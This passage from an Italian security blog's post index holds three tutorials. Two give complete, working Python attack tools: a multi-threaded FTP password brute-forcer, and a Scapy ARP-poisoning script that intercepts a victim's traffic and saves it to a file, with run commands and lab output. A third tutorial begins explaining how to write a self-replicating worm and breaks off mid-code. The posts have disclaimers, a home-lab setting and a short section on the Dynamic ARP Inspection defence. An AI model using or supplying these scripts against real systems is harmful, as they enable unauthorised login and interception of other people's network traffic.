try:\u0026#34;, len(passwords)) Ora tutto ciò che dobbiamo fare è eseguire la funzione di cui sopra su tutte queste password:\n# iterate over passwords one by one # if the password is found, break out of the loop for password in passwords: if is_correct(password): break Ora, questo codice va bene, ma è molto lento. Utilizza un solo thread che tenta in sequenza una connessione FTP su ciascuna password.\nUsiamo i thread per accelerare questo processo; il seguente codice è quello completo che utilizza il multi-threading:\nimport ftplib from threading import Thread import queue from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) # init() # initialize the queue q = queue.Queue() # number of threads to spawn n_threads = 30 # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def connect_ftp(): global q while True: # get the password from the queue password = q.get() # initialize the FTP server object server = ftplib.FTP() print(\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials pass else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials: \u0026#34;) print(f\u0026#34;\\tHost: {host}\u0026#34;) print(f\u0026#34;\\tUser: {user}\u0026#34;) print(f\u0026#34;\\tPassword: {password}{Fore.RESET}\u0026#34;) # we found the password, let\u0026#39;s clear the queue with q.mutex: q.queue.clear() q.all_tasks_done.notify_all() q.unfinished_tasks = 0 finally: # notify the queue that the task is completed for this password q.task_done() # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # put all passwords to the queue for password in passwords: q.put(password) # create `n_threads` that runs that function for t in range(n_threads): thread = Thread(target=connect_ftp) # will end when the main thread end thread.daemon = True thread.start() # wait for the queue to be empty q.join() Fantastico, è abbastanza simile al precedente, ma qui stiamo usando una coda che all\u0026rsquo;inizio è riempita con l\u0026rsquo;elenco delle password, e nella funzione principale che viene eseguita da quei thread daemon, otteniamo una password dal coda e prova ad accedere con esso. Se la password è corretta, dobbiamo terminare la forzatura bruta, un modo sicuro per farlo è cancellare la coda, ed è quello che stiamo facendo.\nAbbiamo anche utilizzato i thread daemon, quindi questi thread termineranno al termine del thread principale.\nEcco il codice completo:\nimport ftplib from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) init() # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def is_correct(password): # initialize the FTP server object server = ftplib.FTP() print(f\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials return False else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials:\u0026#34;, password, Fore.RESET) return True # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # iterate over passwords one by one # if the password is found, break out of the loop for password in passwords: if is_correct(password): break Ecco invece l’esempio piú complesso:\nimport ftplib from threading import Thread import queue from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) # init() # initialize the queue q = queue.Queue() # number of threads to spawn n_threads = 30 # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def connect_ftp(): global q while True: # get the password from the queue password = q.get() # initialize the FTP server object server = ftplib.FTP() print(\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials pass else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials: \u0026#34;) print(f\u0026#34;\\tHost: {host}\u0026#34;) print(f\u0026#34;\\tUser: {user}\u0026#34;) print(f\u0026#34;\\tPassword: {password}{Fore.RESET}\u0026#34;) # we found the password, let\u0026#39;s clear the queue with q.mutex: q.queue.clear() q.all_tasks_done.notify_all() q.unfinished_tasks = 0 finally: # notify the queue that the task is completed for this password q.task_done() # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # put all passwords to the queue for password in passwords: q.put(password) # create `n_threads` that runs that function for t in range(n_threads): thread = Thread(target=connect_ftp) # will end when the main thread end thread.daemon = True thread.start() # wait for the queue to be empty q.join() Prova sul Campo Ora che abbiamo tutto, mettiamo alla prova le nostre conoscenze.\n Disclaimer: ⚠️ Quello che verrà visto di seguito è un esempio per il solo scopo educativo, violare sistemi informatici senza autorizzazione è un reato, vi invito dunque a replicare quanto vedrete SOLO su sistemi di vostra proprietà. ⚠️\n Andiamo a installare vsftpd e inseriamo un nuovo utente. L\u0026rsquo;utente appena creato avrà come credenziali:\n test : test\n Una volta creato l'utente test con la password test possiamo inserire le relative informazioni nello script, useremo il secondo essendo che sfrutta i thread, una volta inserito nello script lo username dell\u0026rsquo;utente che ci interessa e l\u0026rsquo;indirizzo IP della macchina avviamo il codice python con:\npython3 brute-ftp.py Nel mio caso sto eseguendo lo script su un portatile con Pop os e la macchina \u0026ldquo;vittima\u0026rdquo; è una mcchina Ubuntu virtualizzata su VirtualBox. Una volta che lo script ha finito e riesce a trovare la password per l\u0026rsquo;utente test, questo è l\u0026rsquo;output:\n[+] Passwords to try: 7 [!] Trying 123 [!] Trying aheq [!] Trying weeqe [!] Trying 9wee [!] Trying wewe [!] Trying 9002 [!] Trying test [+] Found credentials: Host: 192.168.1.242 User: test Password: test ","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/","tags":["Protocollo FTP","Brute Force","Python","vsftpd"],"title":"Brute Force di un Server FTP"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Cos\u0026rsquo;è il Protocollo ARP Che cos’è l’ARP Poisoning ARP Poisoning con Scapy e Python Come prevenire L\u0026rsquo;ARP Poisoning con DAI   In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l\u0026rsquo;ARP Poisoning.\nHo iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.\nCos\u0026rsquo;è il Protocollo ARP Per approfondire l\u0026rsquo;argomento ti consigli di leggere questo.\nA differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l’indirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell’hardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si può applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell’indirizzo tramite ARP è perciò indispensabile.\nSe ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l’indirizzo MAC appropriato. Così entra in azione l’Address Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l’indirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese “ARP request”) a tutti i dispositivi in rete, questa richiesta comprende all’incirca le seguenti informazioni:\n Un computer con l\u0026rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l\u0026rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell\u0026rsquo;indirizzo MAC giusto.\n La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete è collegato a una tabella locale, detta cache ARP, per evitare che prima dell’invio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell’IP assegnato.\nTutti i computer nella rete annotano così nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Però ci si aspetta una risposta broadcast solo dal computer B, che invia un’ARP reply comprendente le seguenti informazioni:\n Qui il sistema con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz. L\u0026rsquo;indirizzo MAC ricercato è aa-aa-aa-aa-aa-aa.\n Se un’ARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perciò la comunicazione attraverso la rete locale non incontra nessun ostacolo.\nMa cosa succede se non è il computer di destinazione ricercato a rispondere, bensì un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l’ARP poisoning.\nOra che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante può usare le falle del protocollo per i suoi scopi.\nChe cos’è l’ARP Poisoning Lo schema request-response del protocollo ARP è creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell’ARP spoofing, gli hacker cercano perciò di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare così la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perché si intende un “avvelenamento” della cache ARP. Di solito il pacchetto comprende anche l’indirizzo MAC di un dispositivo di rete, controllato dall’hacker. Il sistema della vittima collega così l’IP di uscita con un indirizzo dell’hardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall’hacker, che ha così la possibilità di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene così con l’inganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bensì rifiutati, l’ARP poisoning può comportare un Denial of Service (DoS). Un’altra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; però questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l’intenzione di accettare una risposta. È quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.\nARP Poisoning con Scapy e Python Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.\n Disclaimer: ⚠️ Quello che starete per vedere è un esempio di attacco informatico che sto svolgendo su sistemi di mia proprietà. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione è un illecito. ⚠️\n Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.\nPer prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:\nifconfig [interface] interface dovrà essere sostituito con il nome dell’interfaccia di rete della macchina vittima, nel mio caso l’interfaccia è wlp61s0, l’output dovrà essere un qualcosa simile a:\nwlp61s0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.1.22 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fe80::bf57:5b8e:8ef6:fe0b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether b4:6b:fc:a3:63:99 txqueuelen 1000 (Ethernet) RX packets 190150 bytes 230866258 (230.8 MB) RX errors 0 dropped 2237 overruns 0 frame 0 TX packets 52365 bytes 14313727 (14.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Il comando ifconfig ci mostra la configurazione della rete per un’interfaccia specifica (in quest’esempio è la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.\nL’output mostra che l’indirizzo inet (IPv4) per il dispositivo è 192.168.1.22. È mostrato anche l’indirizzo mac ether che è b4:6b:fc:a3:63:99.\nOra vediamo la cache ARP della macchina vittima, usiamo il comando:\narp -a Il risultato è qualcosa del tipo:\nwind3.hub (192.168.1.1) associato a b8:d5:26:69:b5:dc [ether] su wlp61s0 Kobra3390.wind3.hub (192.168.1.233) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 192.168.1.233 è l’indirizzo IP della macchina Kali, mentre 192.168.1.1 è l’indirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell’indirizzo MAC registrato per il gateway.\nConoscendo l’indirizzo IP dell’attaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): pass class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): pass def run(self): pass def poison(self): pass def sniff(self, count=200): pass def restore(self): pass if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Come si vede, definiamo una funzione helper per ottenere l’ indirizzo MAC per una determinata macchina e una classe Arper per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione get_mac che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:\ndef get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None Le passiamo l’indirizzo IP dell’obiettivo e creiamo un pacchetto. La funzione Ether specifica che il pacchetto è concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l’indirizzo MAC collegato chiedendo a ogni nodo della rete se è in possesso di quell’indirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy srp che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile resp che dovrebbe contenere la sorgente Ether (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe Arper:\nclass Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l’interfaccia che vogliamo utilizzare (eth0 è l’opzione di default). Popoliamo le variabili interne dell’oggetto con interface, victim, victimmac, gateway e gatewaymac stampandone i valori a console.\nAll’interno della classe Arper scriviamo la funzione run che rappresenta l’entry point del nostro attacco:\ndef run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) Il metodo run esegue tutto il lavoro principale dell’oggetto Arper. Imposta ed esegue due processi:\n Il primo avvelena la cache ARP Il secondo ci permette di osservare l’evoluzione dell’attacco sniffando il traffico di rete  Il metodo poison produce i pacchetti “avvelenati” e li invia alla vittima e al gateway:\ndef poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) Il metodo poison imposta i dati che useremo per “avvelenare” la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP poisoned per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l’indirizzo IP della vittima ma con il MAC dell’aggressore. Facciamo poi lo stesso inviando alla vittima l’indirizzo IP del gateway ma con il MAC address dell’aggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.\nPoi iniziamo a spedire i pacchetti “avvelenati” alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell’attacco.\nPorremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da lì ripristineremo la situazione riportandola alla normalità, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.\nPer vedere e registrare cosa succede durante le nostre operazioni di poisoning, intercettiamo il traffico di rete con il metodo sniff:\ndef sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) Il metodo sniff resta in pausa per cinque secondi prima di iniziare lo sniffing per dare tempo al thread che esegue il vero e proprio poisoning di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l’indirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo arper.pcap, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l’attacco.\nDa ultimo, il metodo restore riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:\ndef restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) Il metodo restore potrebbe essere chiamato sia da poison (dopo un CTRL-C), sia da sniff (quando il numero di pacchetti richiesti è stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.\nEcco il codice completo:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) def run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) self.sniff_thread.start() def poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) def sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) def restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Prima di avviare l’attacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:\nsudo echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward Ora che l’IP forwarding è stato importato, avviamo lo script con:\nsudo python3 arper.py [IP vittima] [IP gateway] [interface] Ad esempio:\nsudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0 L’output durante l’attacco:\n? (192.168.1.1) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 ? (192.168.1.176) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 Si vede che la vittima malcapitata ha una cache ARP compromessa, poichè il gateway risulta avere lo stesso indirizzo MAC dell’attaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.\nCome prevenire L\u0026rsquo;ARP Poisoning con DAI L\u0026rsquo;ispezione ARP dinamica (DAI) è una funzione di sicurezza che rifiuta i pacchetti ARP non validi e dannosi. La funzione impedisce una classe di attacchi man-in-the-middle, in cui una stazione ostile intercetta il traffico per altre stazioni avvelenando le cache ARP dei suoi ignari vicini. Il malintenzionato invia richieste o risposte ARP mappando l\u0026rsquo;indirizzo IP di un\u0026rsquo;altra stazione al proprio indirizzo MAC.\nDAI si basa sullo snooping DHCP. Lo snooping DHCP ascolta gli scambi di messaggi DHCP e crea un database di associazioni di tuple valide (indirizzo MAC, indirizzo IP, interfaccia VLAN).\nQuando DAI è abilitato, lo switch elimina il pacchetto ARP se l\u0026rsquo;indirizzo MAC e l\u0026rsquo;indirizzo IP del mittente non corrispondono a una voce nel database dei binding di snooping DHCP. Tuttavia, può essere superato attraverso mappature statiche. I mapping statici sono utili quando gli host configurano indirizzi IP statici, lo snooping DHCP non può essere eseguito o altri switch nella rete non eseguono l\u0026rsquo;ispezione ARP dinamica. Una mappatura statica associa un indirizzo IP a un indirizzo MAC su una VLAN.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/","tags":["Protocollo ARP","ARP Poisoning","Python","Scapy","DAI"],"title":"Introduzione All'ARP Poisoning"},{"categories":["Tutorial","Malware Analysis"],"contents":"Table Of Contents:\n Cos\u0026rsquo;è un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual\u0026rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos\u0026rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.\nCos\u0026rsquo;è un Worm Un worm è un programma software dannoso che si replica sfruttando in modo indipendente le vulnerabilità nelle reti. A differenza di un virus, che richiede l\u0026rsquo;esecuzione di un programma host, i worm possono essere eseguiti da soli. A parte l\u0026rsquo;infezione iniziale dell\u0026rsquo;host, non richiedono la partecipazione dell\u0026rsquo;utente e possono diffondersi molto rapidamente sulla rete, di solito rallentandola.\nI worm condividono schemi simili: sfruttano le vulnerabilità del sistema, hanno un modo per propagarsi e contengono tutti codice dannoso (payload) per causare danni ai sistemi o alle reti dei computer. I worm sono responsabili di alcuni degli attacchi più devastanti su Internet. Nel 2001, il worm Code Red aveva infettato oltre 300.000 server in sole 19 ore.\nAlcune persone pensano che un worm informatico e un virus informatico siano la stessa cosa perché i due si comportano in modo simile. Potrebbero persino usare termini come \u0026ldquo;worm computer virus\u0026rdquo; o \u0026ldquo;worm virus malware\u0026rdquo;. La verità è che i due sono minacce comparabili ma diverse.\nLa differenza fondamentale tra un virus e un worm è che i virus si basano sull\u0026rsquo;azione umana per l\u0026rsquo;attivazione e hanno bisogno di un sistema host per replicarsi. In altre parole, un virus non danneggerà il tuo sistema a meno che tu non lo esegua. Ad esempio, un virus su un\u0026rsquo;unità flash collegata al tuo computer non danneggerà il tuo sistema a meno che tu non lo attivi. E come accennato in precedenza, un worm non ha bisogno di un sistema host o di un\u0026rsquo;azione dell\u0026rsquo;utente per diffondersi.\nNel corso degli anni, ci sono stati alcuni vermi particolarmente devastanti. Alcuni vermi hanno causato miliardi di danni. Ecco un breve elenco di alcuni famigerati:\n Morris Worm: noto anche come Internet worm, questo è stato uno dei primi worm informatici a diffondersi tramite Internet e guadagnare notorietà nei media. Bagle: noto anche come Beagle, Mitglieder e Lodeight, questo worm di mailing di massa aveva molte varianti. Blaster: noto anche come MSBlast, Lovesan e Lovsan, questo worm ha attaccato i computer con Windows XP e Windows 2000. Conficker: noto anche come Downup, Downadup e Kido, questo worm ha sfruttato i difetti di Windows per infettare milioni di computer in oltre cento paesi. ILOVEYOU: Il worm ILOVEYOU ha infettato decine di milioni di computer in tutto il mondo, causando danni per miliardi di dollari. Mydoom: questo è diventato il worm di posta elettronica a più rapida diffusione nel 2004, inviando posta indesiderata attraverso i computer. Ryuk: Sebbene Ryuk non sia sempre stato un worm, ora è un ransomware simile a un worm. SQL Slammer: il worm SQL Slammer ha guadagnato fama per aver rallentato il traffico Internet con attacchi denial-of-service su alcuni host Internet. Storm Worm: questo worm ha utilizzato l\u0026rsquo;ingegneria sociale con notizie false di una tempesta disastrosa per lanciare botnet su macchine compromesse. Stuxnet: alcuni esperti ritengono che questo sofisticato worm sia stato sviluppato per anni per lanciare un attacco informatico.  Molti dei sintomi di un worm informatico sono simili a quelli di un virus informatico. Ad esempio, potresti avere un worm se il tuo computer rallenta, si blocca, si blocca o genera messaggi di errore. Potresti anche notare che i file sono mancanti o danneggiati o che lo spazio sul tuo disco rigido si sta rapidamente esaurendo inspiegabilmente. Inoltre, potresti ricevere avvisi dal tuo firewall su una violazione.\nCome altre forme di malware, i worm informatici possono essere fermati con il giusto software antivirus e antimalware e pratiche informatiche sicure. Si prega di non intrattenere collegamenti sospetti, e-mail, testi, messaggi, siti Web, reti di file P2P e unità. Inoltre, aggiorna regolarmente il tuo software essenziale per proteggere il tuo computer da vulnerabilità come il difetto di Windows wormable e simili.\nScrivere un worm in Python Il worm è un tipo di malware che replica se stesso e altri file per consumare spazio nei nostri dischi rigidi. Potresti scoprire che le tue unità o partizioni si riempiono senza alcun motivo visibile e ciò potrebbe accadere a causa di un worm.\nUn worm è diverso da un virus informatico in quanto i virus tipici infettano solo i file e i worm replicano i file e tengono i duplicati fuori dalla vista (come file nascosti).\nAvremo bisogno di due moduli per scrivere un worm. Qui, os è il modulo più importante e lo utilizzeremo per elencare tutti i file e le directory oltre a recuperare i percorsi assoluti.\nshutil è usato per copiare il contenuto del file. Ci sono ovviamente altri modi per farlo, tuttavia, ho scelto di farlo usando il metodo shutil.copyfile().\nimport os import shutil Innanzitutto, creiamo una classe Worm e un metodo di inizializzazione per passare gli argomenti iniziali alla nostra classe creata.\nclass Worm: def __init__(self, path=None, target_dir_list=None, iteration=None): if isinstance(path, type(None)): self.path = \u0026#34;/\u0026#34; else: self.path = path if isinstance(target_dir_list, type(None)): self.target_dir_list = [] else: self.target_dir_list = 